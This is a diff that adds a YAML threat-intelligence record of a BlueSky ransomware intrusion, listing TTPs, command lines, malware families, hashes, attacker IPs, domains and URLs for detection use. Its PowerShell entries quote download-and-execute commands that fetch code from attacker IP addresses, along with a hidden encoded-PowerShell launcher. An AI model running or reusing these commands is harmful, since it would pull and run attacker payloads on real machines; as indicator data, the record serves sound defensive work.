@@ -1,0 +1,80 @@
+description: SQL Brute Force Leads to BlueSky Ransomware. Initial access via MSSQL
+  brute force attack, followed by Cobalt Strike and Tor2Mine for post-exploitation
+  activities.
+attribution:
+- threat_actor: Unspecified
+  country: Unspecified
+malware_families:
+- BlueSky
+- Cobalt Strike
+- Tor2Mine
+TTPs:
+  processes:
+  - winlogon.exe
+  - powershell.exe
+  - cmd.exe
+  commandline:
+  - powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc [base64 encoded content]
+  - cmd.exe /c powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc [base64 encoded
+    content]
+  powershell:
+  - iex ((New-Object System.Net.WebClient).DownloadString("http://5.188.86.237:8080/DFUKr"))
+  - iex ((New-Object System.Net.WebClient).DownloadString("http://83.97.20.81/meta"))
+  scripting_engine:
+  - checking.ps1
+  - del.ps1
+  - PrivFalse.bat
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: powershell.exe
+    destination_address: 5.188.86.237
+    port: 443
+  - executable: powershell.exe
+    destination_address: 83.97.20.81
+    port: 443
+  file_activity:
+  - C:\ProgramData\Oracle\Java\java.exe
+  - C:\Windows\System32\WinRing0x64.sys
+  persistence:
+  - Scheduled Tasks and Windows Services referencing Tor2Mine miner java.exe, encoded
+    PowerShell commands, .hta files hosted on Tor2Mine servers
+  pipes: []
+  process_relations:
+  - winlogon.exe -> powershell.exe -> cmd.exe
+IOCs:
+  hashes:
+  - md5: 9e88c287eb376f3c319a5cb13f980d36
+    sha1: 501af977080d56a55ff0aeba66b58e7f3d1404ea
+    sha256: 74b6d14e35ff51fe47e169e76b4732b9f157cd7e537a2ca587c58dbdb15c624f
+  - md5: 7b68bc3dd393c2e5273f180e361f178a
+    sha1: 07610f11d3b8ccb7b60cc8ad033dda6c7d3940c4
+    sha256: d4f4069b1c40a5b27ba0bc15c09dceb7035d054a022bb5d558850edfba0b9534
+  - md5: 0c0195c48b6b8582fa6f6373032118da
+    sha1: d25340ae8e92a6d29f599fef426a2bc1b5217299
+    sha256: 11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5
+  - md5: bfd36fd6a20ccd39f5c3bb64a5c5dd8b
+    sha1: e938646862477e598fcda20d0b7551863f8b651c
+    sha256: 35b95496b243541d5ad3667f4aabe2ed00066ba8b69b82f10dd1186872ce4be2
+  - md5: 08bdf000031bbad1a836381f73adace5
+    sha1: 3dff4ae3c421c9143978f8fc9499dca4aed0eac5
+    sha256: f955eeb3a464685eaac96744964134e49e849a03fc910454faaff2109c378b0b
+  - md5: 42a80cc2333b612b63a859f17474c9af
+    sha1: e7be97fb2200eb99805e39513304739a7a28b17e
+    sha256: 3b463c94b52414cfaad61ecdac64ca84eaea1ab4be69f75834aaa7701ab5e7d0
+  IPs:
+  - 5.188.86.237
+  - 83.97.20.81
+  domains:
+  - qlqd5zqefmkcr34a[.]onion[.]sh
+  - asq[.]d6shiiwz[.]pw
+  - asd[.]s7610rir[.]pw
+  - asq[.]r77vh0[.]pw
+  URLs:
+  - http://5.188.86.237:8080/DFUKr
+  - http://83.97.20.81/meta
+authors:
+- '@yatinwad'
+reference: https://thedfirreport.com/2023/12/04/sql-brute-force-leads-to-bluesky-ransomware/
+date_of_publication: December 04, 2023
+file_creation_date: July 28, 2025
